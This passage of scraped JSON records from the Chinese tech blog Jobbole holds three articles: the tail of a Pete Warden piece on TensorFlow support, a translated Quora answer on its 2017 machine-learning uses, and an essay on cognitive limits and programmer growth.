Office）这样的项目中学到过很多东西。我们还有一支非常努力的开发者关系专家团队来协助我们，他们还处理了很多围绕文档、代码示例以及其他一些开发者经验问题而产生的体力活。我们的长期目标是将关键的专业知识传递到核心开发者之外，以便更多 Google 内部和外部的人员能对社区做出贡献。</p>\n<p>让核心工程师“兼职”承担客户服务工作的一大好处是可以直接了解用户所遇到的问题。参与客户服务也驱动着我们去改进常见的错误并增加文档，因为它在减少工作量方面让我们看到了直接的回报。</p>\n<p>展望未来，我们希望可以将这项工作更广泛地进行下去，也希望更多人可以熟悉框架的细节、文档的改进，我们创建了更多的“指导手册”以帮助人们处理常见任务（如错误分类）。在此之前，我为有机会和如此多的外部开发者进行互动而感到幸运，也希望通过帮助他们使用机器学习创造新的令人惊叹的应用，从而产生积极的影响。</p>\n<p>关于作者：</p>\n<p><a href=\"https://www.oreilly.com/people/9cbf6-pete-warden\" target=\"_blank\" rel=\"nofollow\">Pete Warden </a>是 TensorFlow Mobile 团队的技术主管，之前是 Jetpac 的首席技术官，该公司于 2014 年被 Google 收购，主要工作是优化其在移动和嵌入式设备上的深度学习技术。他曾在苹果公司工作，负责图像处理的 GPU 优化，并为 O’Reilly 撰写过关于数据处理的书籍。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111200\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111200votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111200\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/86a72531c8845e07f09b2d42649f2253.jpg"], "fav_nums": 3, "comment_nums": 0, "create_date": "2017/05/19", "praise_nums": 1}
{"tags": "机器学习,Quora,IT技术", "front_image_path": "full/c8b802de5bdc21490e5a2a7e1882a02e3bf9b939.jpg", "title": "Quora 在 2017 年是如何运用机器学习的", "url_object_id": "9a7d1647c5c6eee581cab0ec204d5bdc", "url": "http://blog.jobbole.com/111144/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/young605867996\">Lada</a> 翻译，<a href=\"http://www.jobbole.com/members/oliverpp\">蒋生武</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.quora.com/How-does-Quora-use-machine-learning-in-2017/answer/Nikhil-Dandekar\">Nikhil-Dandekar</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>Quora 的 Engineer Manager 讲解 Quora 在 2017 年如何运用机器学习优化问题检索、邀请、回答的排序和广告等。</p>\n<p>早在 2015 年，我们的工程副总 Xavier Amatriain 就在 Quora 上写过一个关于我们如何使用机器学习的最佳回答：《<a href=\"http://blog.jobbole.com/89461/\" target=\"_blank\">2015 年 Quora 是如何使用机器学习的？</a><strong>》</strong></p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffm5tgz8x4j20kv0ay758.jpg\" width=\"600\" height=\"315\"></p>\n<p>此后，机器学习在 Quora 上的使用大量增多。我们不仅对现有的机器学习应用，在更大更好的模型上研究得更深远，而且也扩大了我们使用机器学习的领域集合。在该回答中，我将试着重新绘制 Quora 对机器学习的使用在 2017 年的景象。</p>\n<h2>机器学习用例</h2>\n<p>我会贯穿产品的不同部分，来谈论我们在这些部分是如何使用机器学习的。</p>\n<h3>1.搜索信息</h3>\n<p class=\"\">知识共享在 Quora 上的主要形式是提问和回答。这始于用户拥有一个问题，或他们想要满足的一种“信息需求”。当用户在 Quora 上提出一个新的问题之后，我们有一套机器学习系统完成<strong><strong>问题理解</strong></strong>，即使用一种有助于为我们简化后续流程的方式，从问题中提取信息。我将对问题理解系统做一些描述。</p>\n<p>我们非常关心内容质量，而这一切都始于提问的质量。我们有一个机器学习（ML）体系对每个问题进行<strong><strong>问题质量分类</strong></strong>，并帮助我们区分高质量和低质量的问题。除了提问质量，我们也定义了一些不同的<strong><strong>问题类型</strong></strong>来帮助我们确定在之后的流程中该如何对待这个问题。</p>\n<p>最后，我们也做<strong>提问话题的标签</strong>，来确定提问是关于什么话题。虽然大多数话题建模应用能处理大型文档文本和小型话题本体，我们仍使用简短的问题文本和<strong><a href=\"https://data.quora.com/The-Quora-Topic-Network-1\">超过一百万的潜在主题</a></strong>给问题做标签，这使给问题分类变得更具挑战性。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/04/a0ddfccd8cdf074f135cc63affa789e2.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/a0ddfccd8cdf074f135cc63affa789e2.jpg\" alt=\"1\"></a></p>\n<p>在所有的问题理解模型中，我们使用了提取自问题和上下文的特征。比如，问过该问题的用户、问过该问题的场所等等。</p>\n<p>满足用户信息需求的另一种方法，是通过让他们搜索现有的问题来给予他们正在寻找的答案。我们有两个主要的搜索系统：位于Quora 主页顶部搜索栏的<strong><strong>提问栏搜索</strong></strong>，以及可以通过单击提问栏结果上的“搜索”选项，进行深度搜索的<strong><strong>全文搜索</strong></strong>。这两个搜索系统使用不同的排序算法，根据搜索速度、相关性、结果的广度和深度，其返回的结果有所不同。</p>\n<h3>2.获得问题的答案</h3>\n<p>问题理解系统的输出，形成了问题生命周期中下一步的重要输入：从专家那获得答案。我们同样有机器学习系统帮助我们更好地解决这个问题。</p>\n<p><strong class=\"okmemo-dragging\">请求回答</strong>（Request Answers，以前被称为Ask To Answer）是 Quora 的一个功能。该功能允许用户发送请求给其他用户，让他们为一个特定的提问写回答。我们将请求回答定性为一个机器学习问题。在该博客帖文覆盖了我们对这个系统的细节：<strong><a href=\"https://engineering.quora.com/Ask-To-Answer-as-a-Machine-Learning-Problem\">Ask To Answer as a Machine Learning Problem</a></strong>。</p>\n<p>在请求回答（A2A）之外，匹配待回答问题和专家答主的主要方式是通过 Quora 主页的推荐内容。<strong><strong>对信息流中的提问进行排序</strong></strong>对我们来说是个非常重要的问题。我们把问题属性（如前所述）、用户属性（更多介绍见下文），以及一系列其他的原始特征和派生特征考虑在内，作为排序模型的输入，为你生成一个热门的、相关的且个性的推荐内容。例如，这个几天前我的推荐内容截图。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/04/c2156140097c3cdd0b39177d09730561.jpg\"><img class=\"alignnone\" src=\"http://jbcdn2.b0.upaiyun.com/2017/04/c2156140097c3cdd0b39177d09730561.jpg\" alt=\"2\"></a></p>\n<h3>3.阅读内容</h3>\n<p>如上面你在我的推荐内容里所见，推荐内容不仅包括你可以编写答案的问题，还包括值得一读的答案。<strong><strong>对信息流中的回答进行排序</strong></strong>是另一个对我们而言非常重要的机器学习问题。我们在推荐内容中的问题排序和回答排序使用的是类似的底层系统，但目标却大相径庭。因此，在它们的底层系统中使用了不同系列的特征。我们使用机器学习对值得一读的回答排序的另一个地方，是发送给用户的<strong><strong>邮件摘要</strong></strong>。所有这些排序问题，都由相当先进的机器学习系统，提供多个模型和许多不同的特征，来找出最终排序。</p>\n<p>一旦用户发现了一个对他们而言有趣的问题，我们要确保他们在 Quora 上拥有最佳的阅读体验。为了确保与提问最相关的答案被排在最上面，对信息流中的回答排序也是我们一个重要的机器学习应用。我们对回答排序背后的机器学习的讨论细节见此处：<a href=\"https://engineering.quora.com/A-Machine-Learning-Approach-to-Ranking-Answers-on-Quora\"><strong><strong><span id=\"pos_placeholder\" style=\"width: 0px;height: 0px;margin: 0px;padding: 0px\"></span>A Machine Learning Approach to Ranking Answers on Quora</strong>. Staying on answers, we also do <strong><strong>comment ranking</strong></strong></strong></a>。目光转回到答案上。我们也做<strong><strong>评论</strong>排序</strong>以确保你在顶部看到与回答最相关的评论。并不单纯考虑支持和反对数，还引入了支持或反对该内容的用户、内容质量、参与活跃度等特征，从而决定最终的排序。</p>\n<p class=\"\">我们也希望确保你阅读一个特定问题的答案后，会有良好的渠道找到相关内容，然后继续你的阅读体验。这样由机器学习技术支持的一个产品功能是<strong><strong>相关问题</strong></strong>。我们在问题页面显示相关问题，他们帮助用户更容易地导航到 Quora 的问题空间。同时帮助你在 Quora 作为阅读器时导航的，是像<strong>相关话题</strong>这样的排序系统（在话题页面像<a href=\"https://www.quora.com/topic/Machine-Learning\">这样</a>显示）和<strong>热门话题</strong>（在首页上显示）。在主页上，我们也显示<strong>关注话题</strong>和<strong>关注用户</strong>的板块，这两个都是个性化推荐系统，它基于我们对你的了解。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/04/97ac1179f7579ba8e24f1c06ec213cac.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/97ac1179f7579ba8e24f1c06ec213cac.jpg\" alt=\"3\"></a></p>\n<p>上述机器学习系统十分重要的一个元素就是个性化。个性化体现于构造与 Quora 每个用户相关的产品和底层系统。构造机器学习系统个性化的一大组成部分是<strong><strong>用户理解</strong></strong>的信号。作为用户理解的部分，我们观察并推导出各种用户特征，如他们喜欢/不喜欢的话题、他们在不同领域的专业知识，以及社交网络的属性。我们也有各种“用户实体”关联系统，例如<strong><strong>用户-</strong>话题亲和度<strong>、</strong>用户-用户亲和度</strong>等。所有这些个性化信号形成了重要的输入，该输入不仅在这部分中用于“阅读”应用，也用于匹配问题和专家答主和其他用例。</p>\n<h3>4.保持较高的内容质量</h3>\n<p>在 Quora 上，最佳用户体验的其中一个关键就是内容质量。我们想确保我们的提问、回答、话题和其他内容，开始于优质，并始终保持优质。为了做到这点，我们有一系列机器学习系统努力保持内容质量。这是其中的几个;</p>\n<ul>\n<li><strong><strong>重复问题检测</strong></strong>：包括检测有相同意图的不同问题，并把它们合并为一个规范的问题。我们在重复问题上的探究谈论细节<strong><a href=\"https://engineering.quora.com/Semantic-Question-Matching-with-Deep-Learning\">见此</a></strong>，还发布了一个<strong><a href=\"https://data.quora.com/First-Quora-Dataset-Release-Question-Pairs\">重复问题数据集</a></strong>，启动了一个<strong><a href=\"https://www.kaggle.com/c/quora-question-pairs\"> Kaggle 竞赛</a></strong>让你可以使用它。</li>\n<li><strong>侮辱性内容检测</strong>：我们在 Quora 有一个政策：“<strong><a href=\"https://www.quora.com/What-is-Quoras-Be-Nice-Be-Respectful-policy/answer/Quora-Official-Account\">友善尊重（Be Nice, Be Respectful）</a></strong>”，但在在线社区，维护它通常是件富有挑战性的事情。我们使用机器学习结合人工审稿者，来帮助识别攻击性和伤害性内容，这样我们能更好的保护用户，并确保他们拥有最佳的 Quora 体验。</li>\n<li><strong>垃圾内容检测</strong>：垃圾内容检测对于最热门的用户产出内容类应用来说，是一个重要问题。对我们来说也一样。我们有一些不同的机器学习系统联合着处理垃圾内容和发布垃圾的用户。</li>\n</ul>\n<p>还有许多其他用于保障质量的机器学习系统，但为了节省篇幅我将不详述他们。</p>\n<h3>5.广告优化</h3>\n<p>2016 年，我们也开始盈利转化。目前，我们在提问页面显示与提问意图相关的广告。我们使用机器学习进行<strong><strong>广告点击率预测</strong></strong>，这确保了我们显示的广告与用户相关，并且对广告商来说超值。我们的机器学习在盈利空间里仍处于初期，在未来几个月和几年里，我们将大力扩展机器学习在这方面的使用。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/04/30ba7110ae912f9e6895d699835a0829.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/30ba7110ae912f9e6895d699835a0829.jpg\" alt=\"4\"></a></p>\n<p>比起上面所列的，我们还有另外的机器学习系统，但为避免该答案过长，我将不详述他们。</p>\n<p><strong>模型和库</strong></p>\n<p>我们授权团队为工作使用最优的模型和工具，而且确保我们通过这些工具能保持标准化和可复用。以下是我们使用的一些模型（排名不分先后）：</p>\n<ul>\n<li>逻辑回归模型（Logistic Regression）</li>\n<li>弹性网络（Elastic Nets）</li>\n<li>梯度提升决策树（Gradient Boosted Decision Trees）</li>\n<li>随机森林（Random Forests）</li>\n<li>（深度）神经网络（(Deep) Neural Networks）</li>\n<li>LambdaMART</li>\n<li>矩阵分解（奇异值分解（SVD）、贝叶斯个性化排序（BPR）、加权交替最小二乘法（Weighted ALS）等）</li>\n<li>向量模型和其他神经语言程序学（NLP）技术</li>\n<li>k-means和其他聚类算法</li>\n<li>以及其他</li>\n</ul>\n<p>我们也支持一系列广泛的开源库和内部库，连同其他一些内部库一起完成类似 Tensorflow、sklearn、xgboost、lightgbm、RankLib、nltk、<strong><a href=\"https://github.com/quora/qmf\">QMF</a></strong>（Quora 自有的矩阵分解库）的工作。</p>\n<h3>机器学习平台</h3>\n<p>自 2015 年以来，我们另一个令人兴奋的发展，是新的机器学习平台团队的形成。机器学习平台团队的目标是使公司里其他的机器学习工程师在机器学习上的工作更容易，包括离线（模型训练）和在线（模型服务）方面的事。在线方面，机器学习平台拥有高可靠性和可用性的系统，能帮助机器学习工程师构建和部署高性能、高成本效率、实时的机器学习系统。离线方面，机器学习平台团队能提供机器学习工程师标准化和可复用的方法，来构建数据管道，更快地完成特征生成和训练模型。</p>\n<p>在 Quora 有一个专门的平台团队支持机器学习，帮助我们加快机器学习的发展速度，使得现在比以前发展得快很多。它还更好地使我们扩展了系统，能每天都处理更大量的数据。在未来的回答中，我们将分享更多关于机器学习平台团队及其路径图的细节。</p>\n<p>我希望这个回答在 2017 年 Quora 是如何使用机器学习上能给你一个好景象。如果上述任何内容使你兴奋，你知道我们在招聘不同的机器学习人才！空缺职位请查看我们的<strong><a href=\"https://www.quora.com/careers\">岗位页面</a></strong>。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111144\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111144votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111144\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996\">Lada</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/B77EEB9D520DE9C7BD42E89DC348FEC7/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            希望了解更多互联网、创业管理、创新思维、前沿技术和设计的知识。渐进明细，持续改进。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/young605867996\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/young605867996/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://littlejanery.blog.163.com/\"><i class=\"fa fa-link\"></i></a> <a title=\"QQ：605867996\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：yao605867996\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/08/73516834d333d2a79d72cfc38b225dd4.png"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/05/16", "praise_nums": 1}
{"tags": " 5 评论 ,职场,思维", "front_image_path": "full/759a999114df6e2094bdf5dee3fe62dc9f855fc7.jpg", "title": "思维的局限", "url_object_id": "eeb2200670f9743832fe29b6e1fd63bb", "url": "http://blog.jobbole.com/110949/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/ityouknow\">纯洁的微笑</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ffrw8w1u4tj20hi0a0749.jpg\"></p>\n<p>我相信大家都可能听到过这样一个故事，一名记者看见农村的一个正在放羊的小孩：</p>\n<blockquote><p>问他“你的理想是什么？”<br>\n小孩回答说：“放羊！”<br>\n“羊儿喂大了干什么？”<br>\n“卖钱！”<br>\n“有了卖羊儿的钱干什么？”<br>\n“娶老婆！”<br>\n“娶老婆干什么？”<br>\n“生小孩！”<br>\n“生小孩来干什么？”<br>\n“放羊！”<br>\n……</p></blockquote>\n<p>这段流传甚广的段子，但是我们想想这个故事背后的原因是什么。放羊的小孩对世界的理解也就是：放羊挣钱娶老婆生小孩再放羊。对外面世界的了解可能趋向于了零，在他的世界里，这就是美好的一切，幸福的生活。对世界认识的局限性会导致思维的局限性，思维的局限性会导致目标的局限性，目标的局限性最终导致行为的局限性，从而影响你人生中的各种选择。</p>\n<h2 id=\"关于贫穷\">关于贫穷</h2>\n<p><strong>故事一</strong></p>\n<p>我在知乎看到的这个故事<a href=\"https://www.zhihu.com/question/56322619/answer/156776118\">你在哪一刻体验到了真正的贫富差距？</a>,故事情节大概是这个样子的。</p>\n<blockquote><p>13年的夏天，作者偶然遇到了一个小伙子，一副农民工的打扮，问去从这里到xx城市应该怎么走？作者有点诧异，因为这里距离XX城市要有100百多公里，给他指了指方向，告诉他往西大约一百多公里。小伙子点点头说了声谢谢大哥就往前走了，以为会是个乞讨者或者流浪汉，讨点钱或要点吃的。可他只是问问路，而且看上去是要徒步过去的意思。小伙子走出去几十米，在人行道边坐下，拿出一瓶水喝了几口，然后低着头摆弄着地下的什么玩意，像是在休息。</p>\n<p>好奇心驱使作者去了解情况，才知道他是要去xx市找自己的老乡，老乡在xx市的一个厂里面工作，工资比现在的高一些，老乡给他拖了一个口信，他现在工作的地方老板不给他发工资并且扣了他的身份证。于是他就准备徒步两百多公里去投靠老乡。小伙子没受过教育，家在云南山区，没有电话，打工是为了补贴家用，同村出来的几个人如今都分散了，没有朋友，没有依靠。小伙子在讲这些的时候，在他的眼睛里没看到赶去见同乡的盼望，没看到被工头欺负后的愤怒，在他看来好像一切都很正常，像是在叙述别人的故事，低垂的眼里空洞无意，就像个老人在等待明天。</p></blockquote>\n<p><strong>故事二</strong></p>\n<p>有次看中央电视台的一个节目，是采访居住在交通闭塞的大山里村民的生活。有一个画面我记忆特别深刻，中央电视台采访一个小伙子，记者问他：你为什么不出去打工来挣钱呢，那个小伙子说了一句，我听不懂你说啥。这句话深深的震撼了我，那个小伙子和我应该是同龄吧，大概也是三十岁左右，几十年没有走出去过小山村，竟然都听不懂普通话，更不敢出去看看外面的世界。那一刻我感觉这个世界在他的眼里充满了迷茫。</p>\n<p>后来村长说，这个村子常年不通公路，村里面的人要出去需要先坐牛车，再坐拖拉机两天后才能到达小县城，村里面就一个小学，一个教室里面坐了六个年级的学生，很多孩子上到一半就回家干活了。这两年有一些年轻人走出了村子去深圳、东莞打工，慢慢的也带动了一些人，但还是有一些年轻人因为不会说普通话，不能直接和人交流，就一直都没有出去，在村里面种地生活。这是21世纪呀，非常有可能他们一辈子就走不去了。</p>\n<p> </p>\n<p>贫穷在这个年代仍然是存在的，只是可能你不了解。但贫穷其实不是最可怕的，最可怕的是贫穷的人不知道贫穷的可怕，不了解外面的世界，所以对他们来讲没有走出去的动力和勇气，只有让他们了解外面的世界，认识外面的世界，从思想上有了改变的动力和目标，才能真正的走出贫穷。</p>\n<p>教育有时候就是开智，明事理 ，认识世界，可以有一个和外界交流的窗口。到现在为止，高考仍然是很多人走出老家，跨越阶级的最公平，最重要的一条道路，虽然它仍然有很多的弊端。</p>\n<h2 id=\"思维误区\">思维误区</h2>\n<p>我上初中的时候，大家都羡慕不上学去外面世界闯荡的人们。去南方打工、当兵、学一门技术的都觉得挺时髦，可以不用上无用的学，勇敢的走出小县城，自己赚钱自己花，再也没有了上学的约束。我初中的五个好兄弟，两个当了兵，一个去学了理发，一个去学了厨师，只有我一个考上高中，继续求学，每年他们回来都会聊聊他们在外面的故事，一番啤酒下肚之后，我是既羡慕又被吸引，对外面的世界充满了憧憬，多年以后我才知道他们在外面受了多少的苦，但是回老家了，必须要搞的在外面很精彩。</p>\n<p>其实上过大学的就比没有上过大学的能力好很多吗？有可能只是在开始的时候选择对了而已。我们都处在一个大的洪流之中，不是说选择了不读书以后就混不好，选择了读书就肯定会有不错的生活。但是整体的机遇来讲，读过大学的比没有读过大学的会更多一点，没有读过大学的人大多从事了体力劳动或者技能类的一些工作，读过大学不管怎么样，大都是白领类的工作。</p>\n<p>我们这里不讨论极个别厉害人的情况，研究一下为什么会出现这种情况。上大学让你在那些方面有了提升，很多人大学四年几乎没有好好学习过，玩了四年照样出来找了不错的工作，所以说大学对人能力的提升不一定会比没有上学的强，在外面对能力的提升反而是更快。我个人认为最本质的是认知的提升会不一样，那怕你的四年什么都没有做，但是你至少看到很多人做的事情，别人做事情的经验也会成为你的的经验，毕业后大家都去找了工作，你肯定也会跟着找了工作，大不了差了一点。都是在认知上，对世界的认识上有了很大的不同，才最终影响了你未来的选择和目标。</p>\n<p>说到这里想起了波仔的那条理论，你的生活水平就是你身边最亲近的五个人的平均值。我就不信你和奥巴马是哥们，还和我一起在敲代码。其实仔细观察你身边的高管，高层，起步就没在一个层级里面。</p>\n<p>程序员呢，其实也是一样。大家有没有一种感觉，刚毕业一年左右的时候是最自信的，觉得自己已经掌握了程序开发的基本规律，应付工作没有问题，简历上写的各种精通，精通前端，精通数据库，精通core java等等。反而工作多年以后越发觉得，研究不够深入涉猎不够广泛，很多的新老技术还都停留在使用阶段。为了解释这个问题我画了两个图。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ffrvhabgsbj20ci0c53yi.jpg\"></p>\n<p> </p>\n<p>把整个的IT知识领域用一个圆圈来表示，黑色实体部分就是我们刚开始认知的区域，因为我们刚开始知道的少，了解的少，里面的圆的周长就会小很多，我们感觉到自己需要了解的东西也相对小。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffrvhfb6a8j20cj0btjrf.jpg\"></p>\n<p> </p>\n<p>当我们通过不断的学习、扩宽自己知识的边界，就像里面的小圆不断的长大一些，我们感受到的未知也越来越多，认识到自己了解的内容占整个体系只是很小的一部分。</p>\n<p>很多人，不是不想学习，是不知道如何去学习，很多时候遇到问题，不知道外界有很多解决方案。另外，不进步不学习不可怕，最可怕的是，比我们厉害的人比我们更努力。</p>\n<h2 id=\"如何打破\">如何打破</h2>\n<p>1、要跳出你的圈子，我从西安到北京，IT行业工作氛围，技术特征完全没有在一个水平线上。要时常的跳出自己的圈子，站到外面去看原来的自己。</p>\n<p>2、读书，不断的读书，不断的读好书，其实读书是了解作者怎么看这个世界，读好书更是了解很多大师人物对世界的理解。通过读书打开自己对世界认识的另一扇窗，技术人除了看技术书籍，更应该看一些其它领域的书，来扩宽自己的视野。</p>\n<p>3、对于技术，多逛逛技术性网站，了解一下最新的前沿知识，比如vue活跃的时候，博客园就出了很多关于vue的教程，微服务火的时候，博客园首页经常有关于微服务的文章，时常关注让你了解有这么个东西，在解决问题的时候或者定方案的时候知道会有这么一个选项。</p>\n<p>4、多走出自己的视角，做为程序员总是以程序的思维去思考问题。比如遇到了问题，这个问题对产品、客户意味着什么，领导是如何考虑的，当领导让你干某件事的时候他关心的什么。刚好我这里有一个职场真实的小故事，分享给大家。</p>\n<blockquote><p>某一线互联网电商平台，空降了一名技术高管，要求紧急上线一个项目，必须三个月上线，安排下去，技术总监认真的分析了需求和现有公司的资源，告知这个项目最少需要四个月加班才能完成，高管说实在没有办法吗，总监说，已经是极限了。高管直接就把这位总监给开了，然后问下一个总监周期需要多久，这位总监考虑了一下说：2个月，高管说，项目你来负责，最后这个项目整整做了六个月，但是大家也都相安无事。</p></blockquote>\n<p>5、培养一个行业之外的爱好，最好是运动类的，只有身体好了，精神才更好，才能体会挥汗之后的畅快之感。具体的，比如坚持每周去户外，在北京的话像绿野这种就可以，参加几次就可以融入组织。程序员的话，建议打羽毛球，感觉这类运动对程序员是最有益处，避免各种颈椎病，游泳也是很好的一个选择。经常保持运动的人，整个人的精神状态是不一样的，我们大多数办公室工作者都处于亚健康状态，锻炼真的很重要。</p>\n<p>6、github对程序员来讲真是一个宝库，提交分享代码都是最基础的，建博客、建网站、建工具github都可以免费让你搞定，可以作为你创意或者实践的一个绝佳场所，也可以好好看看其他牛人的杰作，也有很多github第三方的网站可以帮你找到优秀的开源项目。</p>\n<h2 id=\"最后\">最后</h2>\n<p>很多时候的改变，不是我们不想改变，不愿意改变，是不知道如何改变，不知道什么才是好的选择，或者在深刻一点，很多人到现在都不知道什么是好的什么是坏的。</p>\n<p>所以说很多时候的改变，最先是思维的改变，思维的改变转换成行动，然后达到真正的改变。</p>\n<p>我们是不是这个版本：</p>\n<blockquote><p>“你做程序员干什么？”<br>\n“找个体面又高薪的工作。”<br>\n“找到理想的工作后呢？”<br>\n“再寻觅一个温柔漂亮的好老婆。”<br>\n“找到好老婆后呢？”<br>\n“生一个聪明智慧的孩子！”<br>\n“生了孩子后呢？”<br>\n“从小就好好教育孩子努力学习，考个好大学，最好再做一名程序员！”</p>\n<p>……</p></blockquote>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2017/02/bdbb2fd2100937012521bcca7666214a.png\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2017/02/4d73722317836066abc1944476af6821.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110949\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110949votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110949\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 11 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a 